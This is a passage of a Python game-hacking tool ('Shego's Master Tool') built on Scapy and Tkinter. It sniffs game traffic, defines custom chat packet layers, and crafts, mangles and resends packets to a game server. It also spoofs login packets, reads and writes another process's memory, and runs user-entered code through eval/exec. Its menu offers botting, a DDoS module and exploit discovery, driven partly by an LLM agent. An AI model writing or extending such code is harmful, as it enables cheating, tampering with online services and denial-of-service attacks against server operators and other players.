    def apply_filter_gui(self, event=None):
        filter_val = self.current_filter_text.get().lower(); logging.info(f"GUI: Applying filter '{filter_val}'")
        for item_iid in list(self.packet_tree.get_children()): self.packet_tree.delete(item_iid)
        for uid, pkt in list(self.captured_packets.items()):
            summary_vals = self._get_packet_summary_for_gui(pkt, uid)
            if not filter_val or any(filter_val in str(v).lower() for v in summary_vals):
                try: self.packet_tree.insert("","end",iid=f"pkt_{uid}",values=summary_vals)
                except tk.TclError: pass
        if self.packet_tree.get_children(): self.packet_tree.yview_moveto(1)
    def clear_filter_gui(self): self.current_filter_text.set(""); self.apply_filter_gui()
    def resend_selected_packet_gui(self): 
        items = self.packet_tree.selection()
        if not items: messagebox.showwarning("Shego's Annoyance", "No packet selected!",parent=self.root); return
        try:
            pkt_id = int(items[0].split('_')[-1]); pkt_to_resend = self.captured_packets.get(pkt_id)
            if pkt_to_resend: self.network_module.send_packet(pkt_to_resend.copy()); messagebox.showinfo("Shego's Transmission", f"Pkt ID {pkt_id} sent!",parent=self.root)
            else: messagebox.showerror("Shego's Fury", f"Pkt ID {pkt_id} vanished!",parent=self.root)
        except Exception as e: messagebox.showerror("Shego's Contempt", f"Error re-sending: {e}",parent=self.root)
    def save_capture_gui(self): 
        if not self.captured_packets: messagebox.showwarning("Shego's Scorn", "No packets to save.",parent=self.root); return
        fp = filedialog.asksaveasfilename(defaultextension=".pcap",filetypes=[("PCAP","*.pcap"),("All","*.*")],title="Save Capture",parent=self.root)
        if not fp: return
        try: wrpcap(fp, PacketList(list(self.captured_packets.values()))); messagebox.showinfo("Shego's Record", f"Capture saved: {fp}",parent=self.root)
        except Exception as e: messagebox.showerror("Shego's Failure", f"Save PCAP error: {e}",parent=self.root)
    def update_mangler_rules_display(self):
        if not hasattr(self.tool_ref.network_module, 'packet_mangling_rules'): return
        self.mangler_rules_text.config(state='normal'); self.mangler_rules_text.delete('1.0', tk.END)
        rules = self.tool_ref.network_module.packet_mangling_rules
        if not rules: self.mangler_rules_text.insert(tk.END, "No active mangling rules.")
        else:
            for i, rule in enumerate(rules): self.mangler_rules_text.insert(tk.END, f"{i+1}. Name: {rule.get('name','N/A')}\n   Cond: {rule.get('condition', 'N/A')}\n   Action: {rule.get('action','N/A')}\n\n")
        self.mangler_rules_text.config(state='disabled')
        if self.root and self.root.winfo_exists(): self.root.after(5000, self.update_mangler_rules_display)
    def _get_packet_summary_for_gui(self, packet, unique_id):
        time_str=datetime.datetime.fromtimestamp(packet.time).strftime('%H:%M:%S.%f')[:-3];smac,dmac,etht="","",""
        if Ether in packet:smac,dmac,etht=packet[Ether].src,packet[Ether].dst,hex(packet[Ether].type) if hasattr(packet[Ether],'type') else ''
        sip,dip,proto="","","";sport,dport="","",
        if IP in packet:sip,dip,pnum=packet[IP].src,packet[IP].dst,packet[IP].proto;proto={1:"ICMP",6:"TCP",17:"UDP"}.get(pnum,str(pnum))
        elif IPv6 in packet:sip,dip,pnum=packet[IPv6].src,packet[IPv6].dst,packet[IPv6].nh;proto={6:"TCP",17:"UDP",58:"ICMPv6"}.get(pnum,str(pnum))
        if TCP in packet:sport,dport=packet[TCP].sport,packet[TCP].dport
        elif UDP in packet:sport,dport=packet[UDP].sport,packet[UDP].dport
        return(unique_id,time_str,smac,dmac,etht,sip,dip,proto,sport,dport,len(packet),packet.summary()[:70])
    def update_packet_list(self):
        if not (self.root and self.packet_tree and self.root.winfo_exists()): return
        try:
            processed,filter_s=0,self.current_filter_text.get().lower()
            while not gui_raw_packet_queue.empty() and processed < 50:
                processed+=1;pkt=gui_raw_packet_queue.get_nowait();uid=self.packet_list_counter;self.packet_list_counter+=1;self.captured_packets[uid]=pkt
                summary=self._get_packet_summary_for_gui(pkt,uid)
                if not filter_s or any(filter_s in str(v).lower() for v in summary):
                    try: self.packet_tree.insert("","end",iid=f"pkt_{uid}",values=summary)
                    except tk.TclError: pass 
            tree_items=self.packet_tree.get_children()
            if len(tree_items)>CONFIG["max_packets_in_gui_list"]:
                for item_iid in tree_items[:len(tree_items)-CONFIG["max_packets_in_gui_list"]]:
                    try:self.packet_tree.delete(item_iid)
                    except:pass
            if processed>0 and self.packet_tree.get_children():self.packet_tree.yview_moveto(1)
        except queue.Empty:pass
        except Exception as e:logging.debug(f"GUI update list error: {e}")
        if self.root and self.root.winfo_exists():self.root.after(100,self.update_packet_list)
    def on_packet_select(self, event): 
        selected_items = self.packet_tree.selection()
        for pane_widget in [self.details_text, self.hex_text]:
            pane_widget.config(state='normal'); pane_widget.delete('1.0', tk.END); pane_widget.config(state='disabled')
        if not selected_items: return
        selected_item_iid = selected_items[0]
        uid_str = selected_item_iid.split('_')[-1]
        if not uid_str.isdigit(): logging.warning(f"Non-numeric ID part in '{selected_item_iid}'"); return
        try: packet_unique_id = int(uid_str)
        except ValueError: logging.warning(f"Invalid ID '{uid_str}' in '{selected_item_iid}'"); return
        pkt_to_display = self.captured_packets.get(packet_unique_id)
        if pkt_to_display:
            packet_details_str = ""
            string_io_buffer_for_details = io.StringIO()
            with contextlib.redirect_stdout(string_io_buffer_for_details):
                try: pkt_to_display.show(dump=True)
                except Exception as e_show: print(f"Error during Scapy packet.show(): {e_show}\n\nPacket Summary:\n{pkt_to_display.summary()}")
            packet_details_str = string_io_buffer_for_details.getvalue() 
            string_io_buffer_for_details.close() 
            self.details_text.config(state='normal'); self.details_text.insert(tk.END, packet_details_str); self.details_text.config(state='disabled')
            self.hex_text.config(state='normal'); self.hex_text.insert(tk.END, self._get_hex_ascii_dump(bytes(pkt_to_display))); self.hex_text.config(state='disabled')
        else:
            logging.warning(f"Packet ID {packet_unique_id} not found for display.")
            self.details_text.config(state='normal'); self.details_text.insert(tk.END, f"Shego's note: Packet ID {packet_unique_id} details unavailable."); self.details_text.config(state='disabled')
    def _get_hex_ascii_dump(self, data):
        if not data: return ""
        lines, BPL = [], 16
        for i in range(0, len(data), BPL):
            chunk=data[i:i+BPL];hex_p=' '.join(f'{b:02x}' for b in chunk).ljust(BPL*3-1);ascii_p=''.join(chr(b) if 32<=b<=126 else '.' for b in chunk);lines.append(f'{i:08x}  {hex_p}  {ascii_p}')
        return "\n".join(lines)

class NetworkModule: # Updated with refined ClientSayPacket and debug for send
    def __init__(self):
        logging.info("Network Module Initialized: Ready to dissect, corrupt, and now MANGLE traffic.")
        self.packet_count = 0; self.lock = threading.Lock(); self.packet_log_file_handle = None
        self.packet_mangling_rules = [] 
        
        class ClientSayPacket(Packet):
            name = "ClientSayPacket" 
            fields_desc = [
                XIntField("opcode", 0x76cc88f1),    # Default from "attemptnumber3" / "newwww..."
                IntField("field_A", 0x6b060100),  
                IntField("field_B", 0x00000100),    
                ShortField("field_C", 0x0000),   
                StrNullField("message", "default") 
            ]
        self.ClientSayPacket = ClientSayPacket
        self.ShegoGameLayer = self.ClientSayPacket 

        class ServerChatPacket(Packet): 
            name = "ServerChatPacket"; fields_desc = [ XIntField("opcode",0xc19502d0),IntField("unknown1",0x01010000),IntField("unknown2",0x003e4714),IntField("unknown3",0x00000000),IntField("unknown4",0x0e000000),IntField("unknown5",0x00000000),IntField("unknown6",0x00000000),IntField("message_length",4),StrLenField("message_text","",length_from=lambda pkt:pkt.message_length),ShortField("trailer_padding",0x0000)]
        self.ServerChatPacket = ServerChatPacket
        
    def add_mangling_rule(self, condition_func, action_spec, rule_name="UnnamedRule"):
        if not callable(condition_func): logging.error(f"Rule '{rule_name}' condition must be callable."); return
        action_to_store = None
        if callable(action_spec): action_to_store = action_spec
        elif isinstance(action_spec, dict) and "action_type" in action_spec:
            action_type = action_spec["action_type"]
            if action_type == "modify_payload_byte":
                if "offset" in action_spec and "value" in action_spec:
                    offset, value = action_spec["offset"], action_spec["value"]
                    action_to_store = lambda pkt_param: self.action_modify_payload_byte(pkt_param, offset, value)
                else: logging.error(f"Rule '{rule_name}' for 'modify_payload_byte' missing 'offset' or 'value'."); return
            else: logging.error(f"Unknown predefined action_type '{action_type}' for rule '{rule_name}'."); return
        else: logging.error(f"Rule '{rule_name}' action is invalid."); return
        self.packet_mangling_rules.append({"name": rule_name, "condition": condition_func, "action": action_to_store})
        logging.info(f"Mangling Rule '{rule_name}' added.")
    def clear_mangling_rules(self): self.packet_mangling_rules = []; logging.info("All mangling rules cleared.")
    def list_mangling_rules(self):
        if not self.packet_mangling_rules: logging.info("No mangling rules active."); return
        logging.info("--- Active Packet Mangling Rules ---"); [logging.info(f"{i+1}. {r['name']}") for i,r in enumerate(self.packet_mangling_rules)]
    def action_modify_payload_byte(self, packet, offset, new_byte_value):
        if Raw in packet and hasattr(packet[Raw], 'load'):
            payload = bytearray(packet[Raw].load)
            if 0 <= offset < len(payload):
                if not (0 <= new_byte_value <= 255): logging.error(f"Byte value {new_byte_value} out of range."); return
                payload[offset] = new_byte_value; packet[Raw].load = bytes(payload)
            else: logging.warning(f"Offset {offset} out of bounds for payload len {len(payload)}.")
        else: logging.warning("Packet has no Raw load to modify byte.")
    def _apply_mangling_rules(self, packet): 
        if not self.packet_mangling_rules: return packet
        original_summary = packet.summary(); modified = False
        for rule in self.packet_mangling_rules:
            try:
                if rule["condition"](packet.copy()): rule["action"](packet); modified = True 
            except Exception as e: logging.error(f"Mangling rule '{rule['name']}' error: {e}.")
        if modified:
            logging.info(f"Packet mangled. Original: {original_summary} | New: {packet.summary()}")
            if IP in packet: del packet[IP].chksum 
            if TCP in packet: del packet[TCP].chksum
            if UDP in packet: del packet[UDP].chksum
        return packet
    def send_packet(self, packet, use_proxy_concept=False): 
        try:
            packet_to_send = packet.copy(); packet_to_send = self._apply_mangling_rules(packet_to_send) 
            if use_proxy_concept and CONFIG.get("proxy_chain_config"): logging.info(f"Conceptual proxy send...")
            
            logging.debug(f"Attempting to send packet. Type of Scapy's global 'send' function: {type(send)}")
            if send is None:
                logging.critical("SHEGO'S UTTER BEWILDERMENT: Scapy's 'send' function IS NONE! Cannot send packet.")
                return # Cannot proceed
            if not packet_to_send:
                logging.error("Shego's glare: Packet to send is None. Aborting send.")
                return

            send(packet_to_send, verbose=False)
            logging.info(f"Sent: {packet_to_send.summary()}")
        except Exception as e: 
            logging.error(f"Shego's frustration: Failed to send packet: {e}")
            # Adding traceback for send errors when not in pytest
            if 'pytest' not in sys.modules:
                traceback.print_exc()

    def packet_callback(self, packet): 
        with self.lock:
            self.packet_count += 1; packet_queue.append(packet)
            if len(packet_queue) > CONFIG["max_packets_to_display_console"]*2: packet_queue.pop(0)
            gui_raw_packet_queue.put(packet) 
            if hasattr(self, 'ServerChatPacket') and self.ServerChatPacket in packet: 
                logging.debug(f"SHEGO SAW SERVER CHAT: {packet[self.ServerChatPacket].summary()}")
            elif hasattr(self, 'ClientSayPacket') and self.ClientSayPacket in packet: 
                 logging.debug(f"SHEGO SAW CLIENT CHAT: {packet[self.ClientSayPacket].summary()}")
            if self.packet_log_file_handle:
                try:
                    ts = datetime.datetime.fromtimestamp(packet.time).strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
                    self.packet_log_file_handle.write(f"--- Pkt {self.packet_count} @ {ts} ---\nSummary: {packet.summary()}\n")
                    with io.StringIO() as s, contextlib.redirect_stdout(s): packet.show(dump=True); self.packet_log_file_handle.write(s.getvalue() + "\n\n")
                    self.packet_log_file_handle.flush()
                except Exception as e: logging.error(f"Log despair: {e}")
    def start_sniffing(self, iface=None, filter_str=None): 
        global packet_capture_running
        if packet_capture_running: logging.info("Sniffing already running."); return
        if not filter_str and CONFIG.get("target_ip") and CONFIG.get("target_port"): filter_str = f"host {CONFIG['target_ip']} and (tcp port {CONFIG['target_port']} or udp port {CONFIG['target_port']})"
        try: self.packet_log_file_handle = open(CONFIG["packet_log_file"], "a"); logging.info(f"Logging to {CONFIG['packet_log_file']}")
        except Exception as e: logging.error(f"Log file error: {e}"); self.packet_log_file_handle = None
        packet_capture_running = True; logging.info(f"Sniffing on '{iface or 'default'}'...")
        threading.Thread(target=sniff,daemon=True,kwargs={"prn":self.packet_callback,"iface":iface,"filter":filter_str,"store":False,"stop_filter":lambda p: not packet_capture_running}).start()
    def stop_sniffing(self): 
        global packet_capture_running
        if packet_capture_running:
            packet_capture_running=False; logging.info(f"Sniffing stopped. Pkts: {self.packet_count}")
            if self.packet_log_file_handle: self.packet_log_file_handle.close(); self.packet_log_file_handle=None
    
    def craft_custom_game_packet(self, message_type_opcode, player_id_field_a, data_payload_message_str): 
        logging.debug(f"Crafting custom game packet (ClientSayPacket type) with opcode {hex(message_type_opcode)}")
        # This now more directly calls the specific crafting function for ClientSayPacket
        # For other truly custom packets, a more abstract mechanism or more specific functions are needed.
        return self.craft_specific_client_say_packet(
            message_string=data_payload_message_str, 
            opcode=message_type_opcode,
            field_a=player_id_field_a, 
            # field_B and field_C will use defaults from craft_specific_client_say_packet
        )

    def craft_specific_client_say_packet(self, message_string, opcode=0x76cc88f1, field_a=0x6b060100, field_b=0x00000100, field_c=0x0000):
        server_ip = CONFIG.get("target_ip", "127.0.0.1")
        server_port = int(CONFIG.get("target_port", 8096)) 
        client_sport = random.randint(49152, 65535)
        msg_bytes = message_string.encode('utf-8', 'ignore')
        
        chat_payload = self.ClientSayPacket(opcode=opcode, field_A=field_a, field_B=field_b, field_C=field_c, message=msg_bytes)
        ip_layer = IP(dst=server_ip) if ":" not in server_ip else IPv6(dst=server_ip)
        tcp_layer = TCP(sport=client_sport, dport=server_port, flags="PA") 
        full_packet = ip_layer / tcp_layer / chat_payload
        logging.info(f"Crafted ClientSayPacket: {full_packet.summary()}")
        return full_packet

    def craft_simple_udp_packet(self, data, dst_ip=None, dst_port=None): 
        tip,tp = dst_ip or CONFIG.get("target_ip"), dst_port or CONFIG.get("target_port")
        if not tip or not tp: logging.warning("UDP craft target missing."); return None
        return IP(dst=tip)/UDP(dport=int(tp))/Raw(load=data.encode() if isinstance(data,str) else data)
    def craft_simple_tcp_packet(self, data, dst_ip=None, dst_port=None, seq=None, ack=None, flags="PA"): 
        tip,tp = dst_ip or CONFIG.get("target_ip"), dst_port or CONFIG.get("target_port")
        if not tip or not tp: logging.warning("TCP craft target missing."); return None
        kwargs={'dport':int(tp),'sport':random.randint(1024,65535),'flags':flags}
        if seq is not None: kwargs['seq']=int(seq)
        if ack is not None: kwargs['ack']=int(ack)
        return IP(dst=tip)/TCP(**kwargs)/Raw(load=data.encode() if isinstance(data,str) else data)
    def inject_login_spoof(self, username, password): 
        if not CONFIG.get("target_ip") or not CONFIG.get("target_port"): logging.warning("Login spoof target missing."); return
        logging.info(f"Spoofing login for {username}...")
        pkt = self.craft_simple_tcp_packet(f"LOGIN:{username}:{password}".encode(),flags="S")
        if pkt and sr1: resp = sr1(pkt,timeout=2,verbose=False); logging.info(f"Spoof response: {resp.summary() if resp else 'Timeout'}")
    def display_packets_in_table(self): 
        if not packet_queue: logging.info("No packets in console queue."); return
        hdrs = ("ID", "Time", "SrcMAC", "DstMAC", "EthType", "SrcIP", "DstIP", "Proto", "SrcPort", "DstPort", "Len", "Info")
        data_rows = [] 
        for i, pkt in enumerate(packet_queue[-CONFIG["max_packets_to_display_console"]:]):
            s_ip,d_ip,proto,s_port,d_port,ln,info_s = "","","","","",len(pkt),pkt.summary()[:70]
            if IP in pkt: s_ip,d_ip,proto = pkt[IP].src,pkt[IP].dst,{1:"ICMP",6:"TCP",17:"UDP"}.get(pkt[IP].proto,str(pkt[IP].proto))
            if TCP in pkt: s_port,d_port = pkt[TCP].sport,pkt[TCP].dport
            elif UDP in pkt: s_port,d_port = pkt[UDP].sport,pkt[UDP].dport
            smac = pkt[Ether].src if Ether in pkt else ''
            dmac = pkt[Ether].dst if Ether in pkt else ''
            etht = hex(pkt[Ether].type) if Ether in pkt and hasattr(pkt[Ether], 'type') else ''
            data_rows.append((i+1, time.strftime('%H:%M:%S',time.localtime(pkt.time)),smac,dmac,etht,s_ip,d_ip,proto,s_port,d_port,ln,info_s))
        if tabulate: print(tabulate(data_rows, headers=hdrs, tablefmt="grid"))
        else: print(" ".join(hdrs)); [print(" ".join(map(str,r))) for r in data_rows]

# --- MainControlClass ---
class ShegosMasterTool:
    def __init__(self):
        self.botting_module = BottingModule()
        self.network_module = NetworkModule()
        self.web_scraping_module = WebScrapingModule()
        self.memory_module = MemoryModule(CONFIG["target_game_process_name"]) 
        self.exploit_discovery_module = ExploitDiscoveryModule(self.network_module, self.memory_module)
        self.code_indexer = CodeIndexer(CONFIG["code_index_path"])
        self.sandbox_executor = SandboxExecutor(CONFIG["sandbox_path"])
        self.llm_agent = LLMAgent(LLM_CLIENT, self.code_indexer, CONFIG["patch_history_dir"])
        if self.llm_agent: self.llm_agent.sandbox_executor = self.sandbox_executor
        self.ddos_module = DDoSModule()
        load_proxies(CONFIG["proxy_list_file"])
        logging.info("\nShego's Tool: Initializing auto-detection...")
        self.game_pid = find_game_process_id(CONFIG["target_game_process_name"])
        if self.game_pid:
            if self.memory_module and (not self.memory_module.pid or self.memory_module.pid != self.game_pid):
                if self.memory_module: self.memory_module.close() 
                self.memory_module = MemoryModule(self.game_pid)
            CONFIG["target_ip"], CONFIG["target_port"] = auto_detect_game_server_ip_port(self.game_pid)
            if CONFIG["target_ip"]: logging.info(f"Auto-detected: {CONFIG['target_ip']}:{CONFIG.get('target_port','N/A')}")
            else: logging.warning("Could not auto-detect target IP/Port.")
        else: logging.warning(f"Game process '{CONFIG['target_game_process_name']}' not found.")
        logging.info("\nShego's Master Tool: Operational.")
        self._index_initial_codebase()
        self.gui_root, self.gui_manager = None, None
        if tk and ttk:
            try:
                self.gui_root = tk.Tk(); 
                if self.gui_root.winfo_exists(): self.gui_manager = GUIManager(self.gui_root, self.network_module, self); logging.info("GUI enabled!")
                else: self.gui_root = None; logging.warning("Tk window creation failed.")
            except tk.TclError as e: self.gui_root = None; logging.error(f"GUI init TclError: {e}.")
        else: logging.warning("GUI disabled: Tkinter/ttk missing.")

    def _index_initial_codebase(self): logging.info("Conceptual codebase indexing...") 
    def run_gui(self):
        if self.gui_root and self.gui_root.winfo_exists(): self.gui_root.protocol("WM_DELETE_WINDOW",self.on_gui_close); self.gui_root.mainloop()
    def on_gui_close(self):
        logging.info("GUI closing..."); self.network_module.stop_sniffing()
        if self.gui_root and self.gui_root.winfo_exists(): self.gui_root.destroy(); self.gui_root = None
    
    def add_mangling_rule_interactive(self):
        logging.info("Shego's Workshop: Defining Custom Mangling Rule (UNSAFE LAMBDA)...")
        rule_name = input("Rule Name: ") or f"CustomRule_{random.randint(1000,9999)}"
        active_custom_layer_name = self.network_module.ClientSayPacket.name 
        print(f"\nCONDITION (Python lambda, 'pkt' is packet): e.g., 'TCP in pkt and pkt[TCP].dport == 80' or '{active_custom_layer_name} in pkt'")
        condition_str = input("lambda pkt: ")
        print(f"\nACTION (Python statements, 'pkt' modified. ';' for multiple): e.g., 'pkt[IP].dst=\"1.2.3.4\"' or 'pkt[{active_custom_layer_name}].field_A=0'")
        action_str = input("pkt actions: ")
        try:
            ctx = {"IP":IP,"TCP":TCP,"UDP":UDP,"Raw":Raw,"ICMP":ICMP,"Ether":Ether,"IPv6":IPv6, 
                   active_custom_layer_name : self.network_module.ClientSayPacket, 
                   self.network_module.ServerChatPacket.name : self.network_module.ServerChatPacket, 
                   "random":random,"struct":struct,"logging":logging,"CONFIG":CONFIG}
            cond_fn = eval(f"lambda pkt: {condition_str}", ctx.copy()) 
            def create_act_fn(actions_string):
                def generated_action(pkt):
                    loc_ctx = {"pkt":pkt}; loc_ctx.update(ctx)
                    processed_act_str = actions_string 
                    for line in processed_act_str.split(';'):
                        s_line = line.strip()
                        if s_line: exec(s_line, {"__builtins__":{}}, loc_ctx) 
                return generated_action
            act_fn = create_act_fn(action_str)
            self.network_module.add_mangling_rule(cond_fn, act_fn, rule_name)
        except Exception as e: logging.error(f"Rule creation error for '{rule_name}': {e}")

    def add_modify_byte_rule_interactive(self):
        logging.info("Shego's Workshop: Defining 'Modify Payload Byte' Rule...")
        rule_name = input("Rule Name: ") or f"ModByteRule_{random.randint(1000,9999)}"
        active_custom_layer_name = self.network_module.ClientSayPacket.name
        print(f"\nCONDITION (lambda pkt: ...): e.g., '{active_custom_layer_name} in pkt'")
        condition_str = input("lambda pkt: ")
        try:
            offset = int(input("Payload byte offset (0-based, relevant if Raw layer targeted): "))
            new_byte_value = int(input("New byte value (0-255 or 0xHEX): "), 0) 
            if not (0 <= new_byte_value <= 255): logging.error("Byte value out of range."); return
            
            ctx = {"IP":IP,"TCP":TCP,"UDP":UDP,"Raw":Raw,active_custom_layer_name:self.network_module.ClientSayPacket,"CONFIG":CONFIG}
            condition_func = eval(f"lambda pkt: {condition_str}", ctx) 
            
            action_spec = {"action_type": "modify_payload_byte", "offset": offset, "value": new_byte_value}
            self.network_module.add_mangling_rule(condition_func, action_spec, rule_name)
        except ValueError: logging.error("Invalid integer for offset/value.")
        except Exception as e: logging.error(f"Create 'Modify Byte' rule error: {e}")
    
    def menu(self):
        if self.gui_root and not self.gui_root.winfo_exists(): self.gui_root = None 
        if self.gui_root: logging.info("GUI active. Console for other ops."); self.run_gui(); logging.info("GUI closed. Console active.")
        while True: 
            print("\n" + "="*30 + "\n  Shego's Command Center\n" + "="*30)
            print("1. Botting Ops | 2. Network/Mangler | 3. DataRecon | 4. Memory Ops | 5. DDoS")
            print("6. ReDetect | 7. AgentMetrics | 8. TestSelfHeal | 9. AdvCraft | 10. Exploit")
            current_menu_option = 11 # Start numbering for dynamic options
            if tk and ttk: print(f"{current_menu_option}. Launch GUI"); current_menu_option +=1
            dll_test_option_num = current_menu_option
            print(f"{dll_test_option_num}. DLL Interaction Test (Basic)") 
            exit_opt = dll_test_option_num + 1
            print(f"{exit_opt}. Exit")

            print(f"TARGET: {CONFIG.get('target_ip')}:{CONFIG.get('target_port')} PID:{self.game_pid or 'N/A'}")
            choice = input("Shego demands: ")
            try: 
                if choice == '1': self.botting_menu()
                elif choice == '2': self.network_menu() 
                elif choice == '3': self.data_recon_menu()
                elif choice == '4': self.memory_menu()
                elif choice == '5': self.ddos_menu()
                elif choice == '6': 
                    self.game_pid=find_game_process_id(CONFIG["target_game_process_name"])
                    if self.game_pid: 
                        if self.memory_module and (not self.memory_module.pid or self.memory_module.pid != self.game_pid):
                            if self.memory_module: self.memory_module.close()
                            self.memory_module = MemoryModule(self.game_pid)
                        CONFIG["target_ip"],CONFIG["target_port"]=auto_detect_game_server_ip_port(self.game_pid)
                        logging.info(f"Re-detected Target: {CONFIG.get('target_ip')}:{CONFIG.get('target_port')}")
                    else: logging.warning(f"Game process '{CONFIG['target_game_process_name']}' not found for re-detection.")
                elif choice == '7': 
                    if hasattr(self, 'llm_agent') and self.llm_agent: self.llm_agent.get_learning_metrics()
                    else: logging.warning("LLM Agent not available for metrics.")
                elif choice == '8': 
                    if hasattr(self, 'llm_agent') and self.llm_agent and hasattr(self, 'botting_module'):
                        self.llm_agent.self_healing_loop("Simulated Test Failure in Botting", self.botting_module, "grind_loop")
                    else: logging.warning("LLM Agent or Botting Module not available for self-healing test.")
                elif choice == '9': self.advanced_packet_menu() 
                elif choice == '10': self.exploit_discovery_menu()
                elif tk and ttk and choice == '11': # This is Launch GUI if available (adjust if more options are added before it)
                    if not (self.gui_root and self.gui_root.winfo_exists()): 
                        try: self.gui_root = tk.Tk(); self.gui_manager = GUIManager(self.gui_root, self.network_module, self); self.run_gui()
                        except Exception as e_gui: logging.error(f"GUI launch failed: {e_gui}"); self.gui_root=None
                    else: logging.info("GUI already attempted/running.")
                elif choice == str(dll_test_option_num) : 
                    self.dll_interaction_test_menu()
                elif choice == str(exit_opt): self.shutdown(); break
                else: print("Invalid option, try again you fool.")
            except Exception as e_menu: logging.error(f"Menu error (choice {choice}): {e_menu}"); traceback.print_exc() if 'pytest' not in sys.modules else None

    def dll_interaction_test_menu(self):
        print("\n--- DLL Interaction Test (Kindergarten Level) ---")
        print("1. Show Pathetic Message Box via user32.dll")
        print("2. Back to Main Menu")
        choice = input("Choose your trivial pursuit: ")
        if choice == '1':
            logging.info("Shego commands: Initiating trivial DLL interaction test...")
            show_simple_windows_message_box() # Call the global function
        elif choice == '2':
            return
        else:
            print("Invalid choice, as usual.")

    def botting_menu(self):
        while True:
            print("\n--- Botting Operations ---")
            print("1. Start Grind Loop | 2. Find Image | 3. Click XY | 4. Press Key | 5. Type String | 6. Find & Click | 7. Back")
            choice = input("Automated terror?: ")
            try:
                if not pyautogui and choice in ['1','2','3','4','5','6']: logging.warning("Shego scoffs: PyAutoGUI not available for these actions."); continue
                if choice == '1':
                    x_str = input("X coord for mob (approx, default 100): ") or "100"
                    y_str = input("Y coord for mob (approx, default 100): ") or "100"
                    mob_coords = (int(x_str), int(y_str))
                    attack = input("Attack key (default '1'): ") or '1'
                    loot = input("Loot key (default 'f'): ") or 'f'
                    dur = float(input("Duration in minutes (default 1): ") or "1")
                    self.botting_module.grind_loop(mob_coords, attack, loot, dur)
                elif choice == '2':
                    img_p = input("Path to image file (e.g., 'target.png'): ")
                    if not os.path.exists(img_p): logging.warning(f"Image '{img_p}' not found."); continue
                    conf = float(input("Confidence (0.0-1.0, default 0.9): ") or 0.9)
                    loc = self.botting_module.find_on_screen(img_p, conf)
                    logging.info(f"Image found at: {loc}" if loc else "Image not found.")
                elif choice == '3': self.botting_module.click(int(input("X:")), int(input("Y:")))
                elif choice == '4': self.botting_module.press_key(input("Key:"))
                elif choice == '5': self.botting_module.type_string(input("String:"))
                elif choice == '6':
                    img_p = input("Path to image file to find and click: ")
                    if not os.path.exists(img_p): logging.warning(f"Image '{img_p}' not found."); continue
                    conf = float(input("Conf (0.0-1.0, default 0.9):") or 0.9)
                    ox, oy = int(input("OffX (def 0):") or 0), int(input("OffY (def 0):") or 0)
                    self.botting_module.find_and_click(img_p, conf, ox, oy)
                elif choice == '7': break
                else: print("Invalid.")
            except ValueError: logging.warning("Invalid numeric input.")
            except Exception as e: logging.error(f"Botting menu error: {e}")

    def network_menu(self):
        while True:
            print("\n--- Network Ops & Packet Mangler ---")
            print("1. Start Sniff | 2. Stop Sniff | 3. View Pkts (Console)")
            print("4. Craft UDP | 5. Craft TCP | 6. Login Spoof (Exp.)")
            print("--- Mangler ---")
            print("M1. Add Custom Rule (UNSAFE LAMBDA) | M2. Add 'Modify Byte' Rule")
            print("M3. List Rules | M4. Clear Rules")
            print("B. Back") 
            choice = input("Corrupt or Manage?: ").strip().upper()
            try:
                if choice == '1': self.network_module.start_sniffing(input("Iface (blank=def):")or None, input("Filter (blank=def):")or None)
                elif choice == '2': self.network_module.stop_sniffing()
                elif choice == '3': self.network_module.display_packets_in_table()
                elif choice == '4':
                    pkt = self.network_module.craft_simple_udp_packet(input("UDP Payload: "))
                    if pkt and input(f"Send {pkt.summary()}? (y/n):").lower()=='y': self.network_module.send_packet(pkt)
                elif choice == '5':
                    pkt = self.network_module.craft_simple_tcp_packet(input("TCP Payload: "), flags=input("Flags (def PA):") or "PA")
                    if pkt and input(f"Send {pkt.summary()}? (y/n):").lower()=='y': self.network_module.send_packet(pkt)
                elif choice == '6': self.network_module.inject_login_spoof(input("User:"), input("Pass:"))
                elif choice == 'M1': self.add_mangling_rule_interactive()
                elif choice == 'M2': self.add_modify_byte_rule_interactive()
                elif choice == 'M3': self.network_module.list_mangling_rules()
                elif choice == 'M4': self.network_module.clear_mangling_rules()
                elif choice == 'B': break
                else: print("Invalid.")
            except Exception as e: logging.error(f"Network Menu error: {e}"); traceback.print_exc() if 'pytest' not in sys.modules else None

    def data_recon_menu(self):
        while True:
            print("\n--- Data Reconnaissance ---")
            print("1. Scrape Item Names | 2. Scrape Custom URL | 3. Back")
            choice = input("Uncover secrets?: ")
            try:
                if choice == '1':
                    items = self.web_scraping_module.get_all_item_names()
                    if items: logging.info(f"Scraped {len(items)} item names. First few: {items[:5]}")
                    else: logging.info("No items scraped or error.")
                elif choice == '2':
                    url, method = input("URL: "), (input("Method (GET/POST, def GET):").upper() or 'GET')
                    data, json_p = None, None
                    if method == 'POST': 
                        post_body = input("POST body (or blank):")
                        try: json_p = json.loads(post_body) if post_body.startswith("{") else None
                        except: data = post_body
                        if not json_p and not data and post_body: data = post_body 
                    content = self.web_scraping_module.scrape_data(url,None,method,data,json_p)
                    if content: print(str(content)[:1000] + ("..." if len(str(content))>1000 else ""))
                elif choice == '3': break
                else: print("Invalid option.")
            except Exception as e: logging.error(f"Data Recon error: {e}")

    def memory_menu(self): 
        while True:
            print("\n--- Memory Manipulation (Windows Only) ---")
            print("1. Read Memory | 2. Write Memory | 3. Find AOB | 4. Back")
            if not self.memory_module or not self.memory_module.h_process: logging.warning("Memory functions disabled."); choice = '4'
            else: choice = input("Twist reality?: ")
            try:
                if choice == '1':
                    addr = int(input("Address (hex): "),16); size = int(input("Size (bytes, def 4):") or 4)
                    data = self.memory_module.read_memory(addr,size)
                    if data:
                        logging.info(f"Data @0x{addr:X} (Hex): {data.hex()}")
                        if all(32 <= b <= 126 or b == 0 for b in data): 
                            null_byte_separator = b'\x00' 
                            decoded_string = data.split(null_byte_separator)[0].decode('utf-8','ignore')
                            logging.info(f"As String (UTF-8): {decoded_string}")
                elif choice == '2':
                    addr = int(input("Address (hex):"),16); vtype = input("Type (int,float,str,hexbytes):").lower()
                    val = input(f"Value for {vtype}: ")
                    to_write = None
                    if vtype=='int': to_write=struct.pack('<i',int(val))
                    elif vtype=='float': to_write=struct.pack('<f',float(val))
                    elif vtype=='str': to_write=(val.encode(input("Encoding (def utf-8):") or 'utf-8') + (b'\x00' if input("Null term? (y/n def y):").lower()!='n' else b''))
                    elif vtype=='hexbytes': to_write=bytes.fromhex(val.replace(" ",""))
                    if to_write: self.memory_module.write_memory(addr,to_write)
                    else: logging.warning("Unsupported type for write.")
                elif choice == '3':
